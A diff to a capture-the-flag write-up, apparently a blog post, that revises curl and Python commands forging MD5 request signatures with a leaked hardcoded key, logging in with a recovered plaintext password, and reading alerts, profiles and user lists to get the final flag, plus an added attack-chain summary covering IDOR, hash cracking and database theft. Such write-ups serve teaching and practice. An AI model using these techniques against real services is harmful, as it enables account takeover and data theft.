@@ -239,20 +239,38 @@ mal       ipYs5gLyFe4V2ctFbpE  USER
 Eddie was **fully redacted** in all API responses but his credentials are exposed in the database. The consultant logged in as eddie (SUPER_ADMIN) and applied the same IDOR technique against `/api/profile/`, then called `/api/alerts/` with eddie's token.
 
 ```bash
-┌──(kali㉿kali)-[~]
-└─$ BODY='{"username":"eddie","password":"bvhkVv8UnebiTSvRBYa"}'
-└─$ SIG=$(python3 -c "import hashlib; KEY='Th1\$_1\$_mY_\$3Cr3t_3nCrYpt10N_k3Y'; print(hashlib.md5((KEY+'$BODY').encode()).hexdigest())")
-└─$ EDDIE_TOKEN=$(curl -s -X POST https://chortle.0hl.cc/api/token/ \
-    -H "Content-Type: application/json" \
-    -H "X-Signature: $SIG" \
-    -d "$BODY" | python3 -c "import sys,json; print(json.load(sys.stdin)['access'])")
+BODY='{"username":"eddie","password":"bvhkVv8UnebiTSvRBYa"}'
+SIG=$(python3 -c "import hashlib,json; KEY='Th1\$_1\$_mY_\$3Cr3t_3nCrYpt10N_k3Y'; print(hashlib.md5((KEY+'$BODY').encode()).hexdigest())")
 
-┌──(kali㉿kali)-[~]
-└─$ curl -s -X POST https://chortle.0hl.cc/api/alerts/ \
-  -H "X-Signature: be35213f5990a7778a73ad1ca69e76ec" \
+EDDIE_TOKEN=$(curl -s -X POST https://chortle.0hl.cc/api/token/ \
+  -H "Content-Type: application/json" \
+  -H "X-Signature: $SIG" \
+  -d "$BODY" | python3 -c "import sys,json; print(json.load(sys.stdin)['access'])")
+
+echo "Eddie token: $EDDIE_TOKEN"
+
+SIG_GET="be35213f5990a7778a73ad1ca69e76ec"
+
+EDDIE_BODY='{"id":"37d6e9285ec84a85b21d29e8ca7814fb"}'
+EDDIE_SIG=$(python3 -c "import hashlib; KEY='Th1\$_1\$_mY_\$3Cr3t_3nCrYpt10N_k3Y'; print(hashlib.md5((KEY+'$EDDIE_BODY').encode()).hexdigest())")
+
+# Get eddie's own profile
+curl -s -X POST https://chortle.0hl.cc/api/profile/ \
+  -H "Content-Type: application/json" \
+  -H "X-Signature: $EDDIE_SIG" \
+  -H "Authorization: Bearer $EDDIE_TOKEN" \
+  -d "$EDDIE_BODY"
+
+# Alerts as eddie → FLAG 6
+curl -s -X POST https://chortle.0hl.cc/api/alerts/ \
+  -H "X-Signature: $SIG_GET" \
   -H "Authorization: Bearer $EDDIE_TOKEN" \
   -H "Content-Length: 0"
-[{"id":"211fe1cb-...","message":"PRJBLK{6/6:_w0W,_d@tAb@s3_M1Gr@Ti0n$_R_s0_E@$y!!1!}"}]
+
+# Also get users list as eddie
+curl -s https://chortle.0hl.cc/api/users/ \
+  -H "X-Signature: $SIG_GET" \
+  -H "Authorization: Bearer $EDDIE_TOKEN"
 ```
 
 ![image](/assets/img/pic6.jfif){: .mx-auto .shadow .rounded-10 w="800" }
@@ -260,6 +278,22 @@ Eddie was **fully redacted** in all API responses but his credentials are expose
 > **Flag 6/6:** `PRJBLK{6/6:_w0W,_d@tAb@s3_M1Gr@Ti0n$_R_s0_E@$y!!1!}`
 
 ---
+
+
+## Attack Chain
+```
+challenge6.txt (stego)
+    → flag.zip (password: gandalf) → Flag 1
+    → chortle.0hl.cc
+        → /api/users/ unauthenticated → Flag 2 (in mal's description)
+        → bundle.js hardcoded key → sign any request
+        → nikolai MD5 cracked → valid token
+        → /api/alerts/ → Flag 3
+        → IDOR /api/profile/ with jason's UUID → Flag 4 + jason's password
+        → login as jason → admin dashboard → Flag 5 + file.db download
+        → file.db → eddie's cleartext password
+        → login as eddie → /api/alerts/ → Flag 6
+```
 
 ## All Flags
 
